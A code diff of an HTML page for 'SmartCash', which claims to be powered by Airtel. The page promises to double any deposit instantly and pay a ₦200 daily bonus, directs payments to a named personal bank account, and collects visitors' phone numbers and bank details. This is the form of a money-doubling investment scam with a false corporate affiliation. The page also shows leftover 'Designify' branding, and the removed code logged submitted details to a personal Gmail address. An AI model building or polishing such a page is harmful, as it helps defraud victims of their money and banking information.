@@ -8,116 +8,136 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         .gradient-bg {
-            background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
         }
         .card-hover:hover {
             transform: translateY(-5px);
             box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
         }
-        .upload-area {
-            border: 2px dashed #d1d5db;
-            transition: all 0.3s ease;
-        }
-        .upload-area:hover {
-            border-color: #3b82f6;
-            background-color: #f8fafc;
-        }
-        .pulse {
+        .bonus-pulse {
             animation: pulse 2s infinite;
         }
         @keyframes pulse {
             0% {
-                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7);
             }
-            50% {
-                transform: scale(1.05);
+            70% {
+                box-shadow: 0 0 0 10px rgba(239, 68, 68, 0);
             }
             100% {
-                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(239, 68, 68, 0);
             }
+        }
+        .transaction-item {
+            transition: all 0.3s ease;
+            animation: slideIn 0.5s forwards;
+        }
+        @keyframes slideIn {
+            from { transform: translateX(100px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        .pulse {
+            animation: pulse 1.5s infinite;
+        }
+        .bounce {
+            animation: bounce 0.5s;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        .rotate {
+            animation: rotate 1s;
+        }
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
-<body class="bg-gray-50 font-sans">
-    <!-- Header -->
-    <header class="gradient-bg text-white">
-        <div class="container mx-auto px-4 py-6">
+<body class="font-sans bg-gray-50">
+    <!-- Navigation -->
+    <nav class="gradient-bg text-white shadow-lg">
+        <div class="container mx-auto px-6 py-3">
             <div class="flex justify-between items-center">
-                <div class="flex items-center space-x-2">
-                    <i class="fas fa-wallet text-2xl"></i>
-                    <h1 class="text-2xl font-bold">SmartCash</h1>
+                <div class="flex items-center space-x-4">
+                    <a href="#" class="text-2xl font-bold flex items-center">
+                        <i class="fas fa-wallet mr-2"></i>
+                        SmartCash
+                    </a>
                 </div>
-                <div class="flex space-x-4">
-                    <button onclick="showDepositModal()" class="bg-white text-blue-600 font-bold px-4 py-2 rounded-full hover:bg-gray-100 transition duration-300">
-                        Deposit
-                    </button>
-                    <button onclick="showWithdrawModal()" class="bg-white text-blue-600 font-bold px-4 py-2 rounded-full hover:bg-gray-100 transition duration-300">
-                        Withdraw
+                <div class="hidden md:flex items-center space-x-8">
+                    <a href="#home" class="hover:text-gray-200 transition">Home</a>
+                    <a href="#dashboard" class="hover:text-gray-200 transition">Dashboard</a>
+                    <a href="#deposit" class="hover:text-gray-200 transition">Deposit</a>
+                    <a href="#withdraw" class="hover:text-gray-200 transition">Withdraw</a>
+                    <a href="#faqs" class="hover:text-gray-200 transition">FAQs</a>
+                </div>
+                <div class="md:hidden">
+                    <button id="mobile-menu-button" class="text-white focus:outline-none">
+                        <i class="fas fa-bars text-2xl"></i>
                     </button>
                 </div>
             </div>
+            <!-- Mobile menu -->
+            <div id="mobile-menu" class="hidden md:hidden mt-4 pb-4">
+                <a href="#home" class="block py-2 hover:bg-purple-700 px-2 rounded">Home</a>
+                <a href="#dashboard" class="block py-2 hover:bg-purple-700 px-2 rounded">Dashboard</a>
+                <a href="#deposit" class="block py-2 hover:bg-purple-700 px-2 rounded">Deposit</a>
+                <a href="#withdraw" class="block py-2 hover:bg-purple-700 px-2 rounded">Withdraw</a>
+                <a href="#faqs" class="block py-2 hover:bg-purple-700 px-2 rounded">FAQs</a>
+            </div>
         </div>
-    </header>
+    </nav>
 
     <!-- Hero Section -->
-    <section class="gradient-bg text-white py-12">
-        <div class="container mx-auto px-4 text-center">
-            <div class="max-w-3xl mx-auto">
-                <div class="inline-block bg-white/20 backdrop-blur-sm rounded-full px-6 py-2 mb-4">
-                    <span class="font-bold">NEW</span>
-                    <span class="ml-2">Double your investment instantly!</span>
-                </div>
-                <h2 class="text-4xl font-bold mb-4">Make a deposit today and receive 2x instantly!</h2>
-                <p class="text-xl mb-8">Plus, claim your free ₦200 bonus every 24 hours</p>
-                
-                <div class="flex justify-center items-center space-x-8 mb-8">
-                    <div class="bg-white/10 backdrop-blur-sm rounded-xl p-6 text-center pulse">
-                        <div class="text-5xl font-bold mb-2">2x</div>
-                        <div class="text-sm uppercase tracking-wider">Returns</div>
-                    </div>
-                    <div class="bg-white/10 backdrop-blur-sm rounded-xl p-6 text-center">
-                        <div class="text-5xl font-bold mb-2"><i class="fas fa-bolt"></i></div>
-                        <div class="text-sm uppercase tracking-wider">Instant</div>
+    <section id="home" class="gradient-bg text-white py-20">
+        <div class="container mx-auto px-6">
+            <div class="flex flex-col md:flex-row items-center">
+                <div class="md:w-1/2 mb-10 md:mb-0">
+                    <h1 class="text-4xl md:text-5xl font-bold leading-tight mb-6">SmartCash - Powered by Airtel</h1>
+                    <p class="text-xl mb-8">Make a deposit today and receive double your investment right away! Plus, claim free  ₦200 bonus every 24 hours.</p>
+                    <div class="flex flex-col sm:flex-row space-y-4 sm:space-y-0 sm:space-x-4">
+                        <a href="#deposit" class="bg-white text-purple-800 hover:bg-gray-100 px-8 py-3 rounded-lg font-semibold text-center transition duration-300">Deposit Now</a>
+                        <a href="#dashboard" class="bg-transparent border-2 border-white text-white hover:bg-white hover:text-purple-800 px-8 py-3 rounded-lg font-semibold text-center transition duration-300">View Dashboard</a>
                     </div>
                 </div>
-                
-                <a href="#deposit" class="inline-block bg-white text-blue-600 font-bold px-8 py-3 rounded-full hover:bg-gray-100 transition duration-300">
-                    Get Started Now
-                </a>
+                <div class="md:w-1/2 flex justify-center">
+                    <div class="relative">
+                        <div class="w-64 h-64 bg-white bg-opacity-20 rounded-full flex items-center justify-center">
+                            <span class="text-6xl font-bold">2x</span>
+                        </div>
+                        <div class="absolute -top-5 -right-5 bg-yellow-400 text-gray-900 px-4 py-2 rounded-full font-bold text-sm">INSTANT</div>
+                    </div>
+                </div>
             </div>
         </div>
     </section>
 
     <!-- Features Section -->
     <section class="py-16 bg-white">
-        <div class="container mx-auto px-4">
-            <h2 class="text-3xl font-bold text-center mb-12 text-gray-800">Why Choose SmartCash?</h2>
-            
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
-                <!-- Feature 1 -->
-                <div class="bg-gray-50 p-6 rounded-xl shadow-sm card-hover transition duration-300">
-                    <div class="text-blue-500 text-4xl mb-4">
-                        <i class="fas fa-arrow-up"></i>
+        <div class="container mx-auto px-6">
+            <h2 class="text-3xl font-bold text-center text-gray-800 mb-12">Why Choose Designify?</h2>
+            <div class="grid md:grid-cols-3 gap-8">
+                <div class="bg-gray-50 p-8 rounded-xl shadow-md card-hover transition duration-300">
+                    <div class="text-purple-600 mb-4">
+                        <i class="fas fa-bolt text-4xl"></i>
                     </div>
-                    <h3 class="text-xl font-bold mb-2 text-gray-800">Instant Double Returns</h3>
+                    <h3 class="text-xl font-semibold mb-3 text-gray-800">Instant Double Returns</h3>
                     <p class="text-gray-600">Deposit any amount and get double back immediately after confirmation!</p>
                 </div>
-                
-                <!-- Feature 2 -->
-                <div class="bg-gray-50 p-6 rounded-xl shadow-sm card-hover transition duration-300">
-                    <div class="text-blue-500 text-4xl mb-4">
-                        <i class="fas fa-gift"></i>
+                <div class="bg-gray-50 p-8 rounded-xl shadow-md card-hover transition duration-300">
+                    <div class="text-purple-600 mb-4">
+                        <i class="fas fa-gift text-4xl"></i>
                     </div>
-                    <h3 class="text-xl font-bold mb-2 text-gray-800">Daily Bonus</h3>
+                    <h3 class="text-xl font-semibold mb-3 text-gray-800">Daily Bonus</h3>
                     <p class="text-gray-600">Claim your free ₦200 bonus every 24 hours to boost your earnings.</p>
                 </div>
-                
-                <!-- Feature 3 -->
-                <div class="bg-gray-50 p-6 rounded-xl shadow-sm card-hover transition duration-300">
-                    <div class="text-blue-500 text-4xl mb-4">
-                        <i class="fas fa-money-bill-wave"></i>
+                <div class="bg-gray-50 p-8 rounded-xl shadow-md card-hover transition duration-300">
+                    <div class="text-purple-600 mb-4">
+                        <i class="fas fa-wallet text-4xl"></i>
                     </div>
-                    <h3 class="text-xl font-bold mb-2 text-gray-800">Quick Withdrawals</h3>
+                    <h3 class="text-xl font-semibold mb-3 text-gray-800">Quick Withdrawals</h3>
                     <p class="text-gray-600">Withdraw your funds directly to your mobile money account instantly.</p>
                 </div>
             </div>
@@ -125,314 +145,454 @@
     </section>
 
     <!-- Dashboard Section -->
-    <section class="py-16 bg-gray-50">
-        <div class="container mx-auto px-4">
-            <h2 class="text-3xl font-bold text-center mb-12 text-gray-800">Your Account Dashboard</h2>
-            
-            <div class="max-w-2xl mx-auto bg-white rounded-xl shadow-sm overflow-hidden">
-                <div class="p-6">
-                    <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
-                        <!-- Balance Card -->
-                        <div class="bg-blue-50 p-4 rounded-lg border border-blue-100">
-                            <div class="text-blue-500 mb-2">
-                                <i class="fas fa-wallet"></i>
-                            </div>
-                            <h3 class="text-sm font-medium text-gray-500">Available Balance</h3>
-                            <p class="text-2xl font-bold text-gray-800">₦0</p>
-                        </div>
-                        
-                        <!-- Bonus Card -->
-                        <div class="bg-green-50 p-4 rounded-lg border border-green-100">
-                            <div class="text-green-500 mb-2">
-                                <i class="fas fa-gift"></i>
-                            </div>
-                            <h3 class="text-sm font-medium text-gray-500">Daily Bonus</h3>
-                            <p class="text-2xl font-bold text-gray-800">₦200</p>
-                        </div>
-                        
-                        <!-- Transactions Card -->
-                        <div class="bg-purple-50 p-4 rounded-lg border border-purple-100">
-                            <div class="text-purple-500 mb-2">
-                                <i class="fas fa-exchange-alt"></i>
-                            </div>
-                            <h3 class="text-sm font-medium text-gray-500">Recent Transactions</h3>
-                            <p class="text-gray-800">No transactions yet</p>
-                        </div>
+    <section id="dashboard" class="py-16 bg-gray-50">
+        <div class="container mx-auto px-6">
+            <h2 class="text-3xl font-bold text-center text-gray-800 mb-12">Your Account Dashboard</h2>
+            <div class="grid md:grid-cols-2 gap-8">
+                <div class="space-y-6">
+                    <div class="bg-white p-6 rounded-xl shadow-md">
+                        <h3 class="text-lg font-semibold text-gray-700 mb-2">Available Balance</h3>
+                        <p class="text-3xl font-bold text-purple-600">₦0</p>
                     </div>
-                    
-                    <div class="text-center py-4">
-                        <p class="text-gray-600 mb-4">Start by making a deposit to see your transactions</p>
-                        <a href="#deposit" class="inline-block gradient-bg text-white font-bold px-6 py-2 rounded-full hover:opacity-90 transition duration-300">
-                            Make Deposit
-                        </a>
+                    <div class="bg-white p-6 rounded-xl shadow-md bonus-pulse">
+                        <h3 class="text-lg font-semibold text-gray-700 mb-2">Daily Bonus</h3>
+                        <p class="text-3xl font-bold text-red-500 mb-4">₦200</p>
+                        <button id="bonusBtn" class="bg-red-500 hover:bg-red-600 text-white px-6 py-2 rounded-lg font-semibold transition duration-300 w-full">
+                            Claim Now
+                        </button>
+                        <p id="bonusTimer" class="text-center text-sm text-gray-500 mt-2 hidden"></p>
                     </div>
                 </div>
+                <div class="bg-white p-6 rounded-xl shadow-md">
+                    <h3 class="text-xl font-semibold text-gray-800 mb-4">Recent Transactions</h3>
+                    <div id="transactionsList" class="space-y-4 max-h-96 overflow-y-auto">
+                        <div class="text-center py-8" id="noTransactions">
+                            <i class="fas fa-exchange-alt text-4xl text-gray-300 mb-4"></i>
+                            <p class="text-gray-500 mb-6">No transactions yet. Start by making a deposit!</p>
+                            <a href="#deposit" class="bg-purple-600 hover:bg-purple-700 text-white px-6 py-3 rounded-lg font-semibold inline-block transition duration-300">
+                                Make Deposit
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Withdraw Section -->
+    <section id="withdraw" class="py-16 bg-gray-50">
+        <div class="container mx-auto px-6">
+            <h2 class="text-3xl font-bold text-center text-gray-800 mb-12">Withdraw Funds</h2>
+            <div class="max-w-2xl mx-auto bg-white p-8 rounded-xl shadow-md">
+                <form id="withdrawForm" class="space-y-6">
+                    <div>
+                        <label class="block text-gray-700 font-medium mb-2" for="bank-name">Bank Name</label>
+                        <input type="text" id="bank-name" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent" placeholder="Enter bank name">
+                    </div>
+                    
+                    <div>
+                        <label class="block text-gray-700 font-medium mb-2" for="account-number">Account Number</label>
+                        <input type="text" id="account-number" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent" placeholder="Enter account number">
+                    </div>
+                    
+                    <div>
+                        <label class="block text-gray-700 font-medium mb-2" for="account-name">Account Name</label>
+                        <input type="text" id="account-name" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent" placeholder="Enter account name">
+                    </div>
+                    
+                    <div>
+                        <label class="block text-gray-700 font-medium mb-2" for="withdraw-amount">Amount (₦)</label>
+                        <input type="number" id="withdraw-amount" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent" placeholder="Enter amount to withdraw">
+                    </div>
+                    
+                    <button type="submit" class="gradient-bg hover:opacity-90 text-white px-6 py-3 rounded-lg font-semibold w-full transition duration-300">
+                        Request Withdrawal
+                    </button>
+                </form>
+                
+                <div id="withdraw-status" class="hidden mt-4 p-4 rounded-lg"></div>
             </div>
         </div>
     </section>
 
     <!-- Deposit Section -->
     <section id="deposit" class="py-16 bg-white">
-        <div class="container mx-auto px-4">
-            <h2 class="text-3xl font-bold text-center mb-12 text-gray-800">Make a Deposit</h2>
-            
-            <div class="max-w-md mx-auto bg-gray-50 rounded-xl shadow-sm overflow-hidden p-6">
+        <div class="container mx-auto px-6">
+            <h2 class="text-3xl font-bold text-center text-gray-800 mb-12">Make a Deposit</h2>
+            <div class="max-w-2xl mx-auto bg-gray-50 p-8 rounded-xl shadow-md">
                 <div class="mb-6">
-                    <label for="amount" class="block text-sm font-medium text-gray-700 mb-2">Amount to Deposit (₦)</label>
+                    <label class="block text-gray-700 font-medium mb-2" for="amount">Amount to Deposit (₦)</label>
                     <div class="relative">
-                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
-                            <span class="text-gray-500">₦</span>
-                        </div>
-                        <input type="number" id="amount" class="block w-full pl-8 pr-12 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" placeholder="Enter amount">
+                        <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-700">₦</span>
+                        <input type="number" id="amount" class="w-full pl-8 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent" placeholder="Enter amount">
                     </div>
                 </div>
                 
-                <div class="mb-8">
-                    <h3 class="text-lg font-bold mb-4 text-gray-800">Payment Instructions</h3>
-                    <div class="bg-blue-50 p-4 rounded-lg mb-4">
-                        <p class="text-sm text-gray-600 mb-2">Make payment to:</p>
-                        <div class="grid grid-cols-2 gap-2">
-                            <div>
-                                <p class="text-xs text-gray-500">Account Number</p>
-                                <p class="font-mono font-bold">9126672972</p>
-                            </div>
-                            <div>
-                                <p class="text-xs text-gray-500">Account Name</p>
-                                <p class="font-bold">Jimoh Fatai</p>
-                            </div>
-                        </div>
+                <div class="bg-purple-100 border-l-4 border-purple-600 p-4 mb-6">
+                    <h3 class="font-semibold text-purple-800 mb-2">Payment Instructions</h3>
+                    <p class="text-purple-700">Make payment to:</p>
+                    <div class="mt-2">
+                        <p class="font-medium">Account Number: <span class="font-bold">9126672972</span></p>
+                        <p class="font-medium">Account Name: <span class="font-bold">Jimoh Fatai</span></p>
                     </div>
-                    
-                    <p class="text-sm text-gray-600 mb-4">After payment, upload proof below:</p>
-                    
-                    <div class="upload-area rounded-lg p-8 text-center cursor-pointer mb-4">
-                        <input type="file" id="payment-proof" class="hidden" accept="image/png, image/jpeg, application/pdf">
-                        <label for="payment-proof" class="cursor-pointer">
-                            <div class="text-blue-500 text-4xl mb-2">
-                                <i class="fas fa-cloud-upload-alt"></i>
-                            </div>
-                            <p class="font-medium text-gray-700">Click to upload or drag and drop</p>
-                            <p class="text-xs text-gray-500 mt-1">PNG, JPG, PDF up to 5MB</p>
+                    <p class="mt-2 text-purple-700">After payment, upload proof below:</p>
+                </div>
+                
+                <div class="mb-6">
+                    <label class="block text-gray-700 font-medium mb-2" for="proof">Payment Proof (Screenshot/Receipt)</label>
+                    <div class="border-2 border-dashed border-gray-300 rounded-lg p-4 text-center">
+                        <input type="file" id="proof" class="hidden">
+                        <label for="proof" class="cursor-pointer">
+                            <i class="fas fa-cloud-upload-alt text-4xl text-gray-400 mb-2"></i>
+                            <p class="text-gray-500">Click to upload or drag and drop</p>
+                            <p class="text-sm text-gray-400">PNG, JPG, PDF up to 5MB</p>
                         </label>
                     </div>
-                    
-                    <div class="mb-4">
-                        <label for="phone" class="block text-sm font-medium text-gray-700 mb-2">Your Phone Number</label>
-                        <input type="tel" id="phone" class="block w-full py-3 px-4 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" placeholder="Enter your phone number">
-                    </div>
-                    
-                    <div class="bg-green-50 p-4 rounded-lg border border-green-100 mb-4">
-                        <p class="text-sm text-gray-600">Your withdrawal will be processed within 24 hours. The funds will be sent to your provided account details.</p>
-                    </div>
-                    
-                    <div class="bg-blue-50 p-4 rounded-lg text-center">
-                        <p class="text-sm text-gray-600">You will receive</p>
-                        <p class="text-2xl font-bold text-blue-600">₦0</p>
-                        <p class="text-sm text-gray-600">instantly after deposit confirmation</p>
-                    </div>
                 </div>
                 
-                <button class="w-full gradient-bg text-white font-bold py-3 px-4 rounded-lg hover:opacity-90 transition duration-300">
-                    Submit Payment
+                <div class="mb-6">
+                    <label class="block text-gray-700 font-medium mb-2" for="phone">Your Phone Number</label>
+                    <input type="tel" id="phone" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent" placeholder="Enter your phone number">
+                </div>
+                
+                <button id="depositBtn" class="gradient-bg hover:opacity-90 text-white px-6 py-3 rounded-lg font-semibold w-full transition duration-300">
+                    I Have Transferred the Money
                 </button>
+                <div id="countdown" class="hidden mt-4 text-center text-purple-600 font-bold"></div>
+                
+                <div class="mt-6 bg-green-100 border-l-4 border-green-600 p-4">
+                    <p class="text-green-800">Your withdrawal will be processed within 24 hours. The funds will be sent to your provided account details.</p>
+                    <p class="font-bold mt-2 text-green-800">You will receive ₦0 instantly after deposit confirmation</p>
+                </div>
             </div>
         </div>
     </section>
 
-    <!-- Deposit Modal -->
-    <div id="depositModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
-        <div class="bg-white rounded-lg p-6 max-w-md w-full">
-            <div class="flex justify-between items-center mb-4">
-                <h3 class="text-xl font-bold">Make Deposit</h3>
-                <button onclick="hideModal('depositModal')" class="text-gray-500 hover:text-gray-700">
-                    <i class="fas fa-times"></i>
-                </button>
+    <!-- FAQs Section -->
+    <section id="faqs" class="py-16 bg-gray-50">
+        <div class="container mx-auto px-6">
+            <h2 class="text-3xl font-bold text-center text-gray-800 mb-12">Frequently Asked Questions</h2>
+            <div class="max-w-3xl mx-auto">
+                <div class="bg-white rounded-xl shadow-md overflow-hidden mb-6">
+                    <div class="faq-item border-b border-gray-200">
+                        <button class="faq-question w-full text-left p-6 hover:bg-gray-50 focus:outline-none">
+                            <div class="flex justify-between items-center">
+                                <h3 class="text-lg font-semibold text-gray-800">How does the doubling work?</h3>
+                                <i class="fas fa-chevron-down text-purple-600 transition-transform duration-300"></i>
+                            </div>
+                        </button>
+                        <div class="faq-answer px-6 pb-6 hidden">
+                            <p class="text-gray-600">When you make a deposit, our system automatically doubles your investment immediately after confirmation. For example, if you deposit ₦1000, you'll receive ₦2000 in your account balance.</p>
+                        </div>
+                    </div>
+                    <div class="faq-item border-b border-gray-200">
+                        <button class="faq-question w-full text-left p-6 hover:bg-gray-50 focus:outline-none">
+                            <div class="flex justify-between items-center">
+                                <h3 class="text-lg font-semibold text-gray-800">How do I claim my daily bonus?</h3>
+                                <i class="fas fa-chevron-down text-purple-600 transition-transform duration-300"></i>
+                            </div>
+                        </button>
+                        <div class="faq-answer px-6 pb-6 hidden">
+                            <p class="text-gray-600">Simply visit your dashboard every 24 hours and click the "Claim Now" button on the Daily Bonus card. The  ₦200 will be added to your available balance immediately.</p>
+                        </div>
+                    </div>
+                    <div class="faq-item border-b border-gray-200">
+                        <button class="faq-question w-full text-left p-6 hover:bg-gray-50 focus:outline-none">
+                            <div class="flex justify-between items-center">
+                                <h3 class="text-lg font-semibold text-gray-800">How long do withdrawals take?</h3>
+                                <i class="fas fa-chevron-down text-purple-600 transition-transform duration-300"></i>
+                            </div>
+                        </button>
+                        <div class="faq-answer px-6 pb-6 hidden">
+                            <p class="text-gray-600">Withdrawals are processed instantly in most cases. However, during peak periods it may take up to 15 minutes for the funds to reflect in your mobile money account.</p>
+                        </div>
+                    </div>
+                    <div class="faq-item">
+                        <button class="faq-question w-full text-left p-6 hover:bg-gray-50 focus:outline-none">
+                            <div class="flex justify-between items-center">
+                                <h3 class="text-lg font-semibold text-gray-800">Is there a minimum deposit amount?</h3>
+                                <i class="fas fa-chevron-down text-purple-600 transition-transform duration-300"></i>
+                            </div>
+                        </button>
+                        <div class="faq-answer px-6 pb-6 hidden">
+                            <p class="text-gray-600">The minimum deposit amount is  ₦500. There is no maximum limit - you can deposit as much as you want and receive double instantly!</p>
+                        </div>
+                    </div>
+                </div>
             </div>
-            <div class="mb-4">
-                <label class="block text-sm font-medium text-gray-700 mb-2">Amount to Deposit (₦)</label>
-                <input type="number" id="depositAmount" class="w-full p-2 border rounded" placeholder="Enter amount">
-            </div>
-            <div class="bg-blue-50 p-4 rounded-lg mb-4">
-                <p class="text-sm font-medium mb-2">Deposit to:</p>
-                <p class="font-mono">Account: 9126672972</p>
-                <p class="font-mono">Name: Jimoh Fatai</p>
-                <p class="font-mono">Bank: SmartCash</p>
-            </div>
-            <div id="countdown" class="text-center text-red-500 font-bold mb-4 hidden">
-                Deposit expires in: <span id="time">03:00</span>
-            </div>
-            <button onclick="startDeposit()" class="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700">
-                Confirm Deposit
-            </button>
         </div>
-    </div>
-
-    <!-- Withdraw Modal -->
-    <div id="withdrawModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
-        <div class="bg-white rounded-lg p-6 max-w-md w-full">
-            <div class="flex justify-between items-center mb-4">
-                <h3 class="text-xl font-bold">Withdraw Funds</h3>
-                <button onclick="hideModal('withdrawModal')" class="text-gray-500 hover:text-gray-700">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            <div class="mb-4">
-                <label class="block text-sm font-medium text-gray-700 mb-2">Bank Name</label>
-                <select id="bankName" class="w-full p-2 border rounded">
-                    <option value="">Select Bank</option>
-                    <option value="Opay">Opay</option>
-                    <option value="PalmPay">PalmPay</option>
-                </select>
-            </div>
-            <div class="mb-4">
-                <label class="block text-sm font-medium text-gray-700 mb-2">Account Number</label>
-                <input type="text" id="accountNumber" class="w-full p-2 border rounded" placeholder="Enter account number">
-            </div>
-            <div class="mb-4">
-                <label class="block text-sm font-medium text-gray-700 mb-2">Account Name</label>
-                <input type="text" id="accountName" class="w-full p-2 border rounded" placeholder="Enter account name">
-            </div>
-            <div class="mb-4">
-                <label class="block text-sm font-medium text-gray-700 mb-2">Amount (₦)</label>
-                <input type="number" id="withdrawAmount" class="w-full p-2 border rounded" placeholder="Enter amount">
-            </div>
-            <div class="bg-green-50 p-4 rounded-lg mb-4">
-                <p class="text-sm">Your withdrawal will be processed within 24 hours.</p>
-            </div>
-            <button onclick="submitWithdrawal()" class="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700">
-                Submit Withdrawal
-            </button>
-        </div>
-    </div>
+    </section>
 
     <!-- Footer -->
-    <footer class="bg-gray-800 text-white py-8">
-        <div class="container mx-auto px-4">
+    <footer class="gradient-bg text-white py-12">
+        <div class="container mx-auto px-6">
             <div class="flex flex-col md:flex-row justify-between items-center">
-                <div class="mb-4 md:mb-0">
-                    <div class="flex items-center space-x-2">
-                        <i class="fas fa-wallet text-xl"></i>
-                        <span class="text-xl font-bold">SmartCash</span>
-                    </div>
-                    <p class="text-sm text-gray-400 mt-1">Powered by Airtel</p>
-                </div>
-                
-                <div class="flex space-x-6">
-                    <a href="#" class="text-gray-400 hover:text-white transition duration-300">
-                        <i class="fab fa-facebook-f"></i>
+                <div class="mb-6 md:mb-0">
+                    <a href="#" class="text-2xl font-bold flex items-center">
+                        <i class="fas fa-palette mr-2"></i>
+                        Designify
                     </a>
-                    <a href="#" class="text-gray-400 hover:text-white transition duration-300">
+                    <p class="mt-2">Powered by Airtel Money</p>
+                </div>
+                <div class="flex space-x-6">
+                    <a href="#" class="text-white hover:text-gray-200 text-xl">
+                        <i class="fab fa-facebook"></i>
+                    </a>
+                    <a href="#" class="text-white hover:text-gray-200 text-xl">
                         <i class="fab fa-twitter"></i>
                     </a>
-                    <a href="#" class="text-gray-400 hover:text-white transition duration-300">
+                    <a href="#" class="text-white hover:text-gray-200 text-xl">
                         <i class="fab fa-instagram"></i>
+                    </a>
+                    <a href="#" class="text-white hover:text-gray-200 text-xl">
+                        <i class="fab fa-whatsapp"></i>
                     </a>
                 </div>
             </div>
-            
-            <div class="border-t border-gray-700 mt-6 pt-6 text-center text-sm text-gray-400">
-                <p>&copy; 2023 SmartCash. All rights reserved.</p>
+            <div class="border-t border-white border-opacity-20 mt-8 pt-8 text-center">
+                <p>© 2023 SmartCash. All rights reserved.</p>
             </div>
         </div>
     </footer>
 
     <script>
-        // Modal functions
-        function showDepositModal() {
-            document.getElementById('depositModal').classList.remove('hidden');
-        }
-
-        function showWithdrawModal() {
-            document.getElementById('withdrawModal').classList.remove('hidden');
-        }
-
-        function hideModal(id) {
-            document.getElementById(id).classList.add('hidden');
-        }
-
-        // Deposit with countdown
-        function startDeposit() {
-            const amount = document.getElementById('depositAmount').value;
-            if (!amount) {
-                alert('Please enter an amount');
-                return;
-            }
-            
-            // Show countdown
-            document.getElementById('countdown').classList.remove('hidden');
-            
-            // Start 3 minute countdown
-            let timeLeft = 180;
-            const timer = setInterval(() => {
-                timeLeft--;
-                const minutes = Math.floor(timeLeft / 60);
-                const seconds = timeLeft % 60;
-                document.getElementById('time').textContent = 
-                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        // Track bonus claim time in localStorage
+        let lastBonusClaim = localStorage.getItem('lastBonusClaim');
+        const bonusBtn = document.getElementById('bonusBtn');
+        const bonusTimer = document.getElementById('bonusTimer');
+        
+        // Check if bonus can be claimed
+        function updateBonusButton() {
+            if (lastBonusClaim) {
+                const now = new Date().getTime();
+                const nextClaimTime = parseInt(lastBonusClaim) + 24 * 60 * 60 * 1000;
                 
-                if (timeLeft <= 0) {
-                    clearInterval(timer);
-                    alert('Deposit time expired!');
-                    hideModal('depositModal');
+                if (now < nextClaimTime) {
+                    bonusBtn.disabled = true;
+                    bonusBtn.classList.add('opacity-50', 'cursor-not-allowed');
+                    bonusTimer.classList.remove('hidden');
+                    
+                    const hoursLeft = Math.floor((nextClaimTime - now) / (60 * 60 * 1000));
+                    const minutesLeft = Math.floor(((nextClaimTime - now) % (60 * 60 * 1000)) / (60 * 1000));
+                    bonusTimer.textContent = `Next claim in ${hoursLeft}h ${minutesLeft}m`;
+                } else {
+                    bonusBtn.disabled = false;
+                    bonusBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+                    bonusTimer.classList.add('hidden');
                 }
-            }, 1000);
-            
-            // Send email (simulated)
-            const emailBody = `New Deposit: ₦${amount}`;
-            console.log(`Email sent to ibrahimuthman713@gmail.com: ${emailBody}`);
-            // In a real app, you would use an email API here
-            
-            alert('Deposit instructions sent! Please complete within 3 minutes.');
-        }
-
-        // Withdrawal function
-        function submitWithdrawal() {
-            const bankName = document.getElementById('bankName').value;
-            const accountNumber = document.getElementById('accountNumber').value;
-            const accountName = document.getElementById('accountName').value;
-            const amount = document.getElementById('withdrawAmount').value;
-            
-            if (!bankName || !accountNumber || !accountName || !amount) {
-                alert('Please fill all fields');
-                return;
             }
-            
-            // Send email (simulated)
-            const emailBody = `New Withdrawal Request:
-Bank: ${bankName}
-Account: ${accountNumber}
-Name: ${accountName}
-Amount: ₦${amount}`;
-            
-            console.log(`Email sent to ibrahimuthman713@gmail.com: ${emailBody}`);
-            // In a real app, you would use an email API here
-            
-            alert('Withdrawal request submitted! You will receive your funds within 24 hours.');
-            hideModal('withdrawModal');
         }
-
-        // Simple animation for file upload
-        document.getElementById('payment-proof').addEventListener('change', function(e) {
-            const fileName = e.target.files[0]?.name || 'No file selected';
-            const uploadArea = document.querySelector('.upload-area');
+        
+        // Update bonus button on page load
+        updateBonusButton();
+        
+        // Claim bonus function
+        bonusBtn.addEventListener('click', function() {
+            const balanceElement = document.querySelector('#dashboard .bg-white:nth-child(1) p');
+            let currentBalance = parseInt(balanceElement.textContent.replace('₦', ''));
+            currentBalance += 200;
+            balanceElement.textContent = `₦${currentBalance}`;
             
-            if (e.target.files.length > 0) {
-                uploadArea.innerHTML = `
-                    <div class="text-green-500 text-4xl mb-2">
-                        <i class="fas fa-check-circle"></i>
+            // Add transaction
+            addTransaction('Bonus Credit', '₦200', 'success');
+            
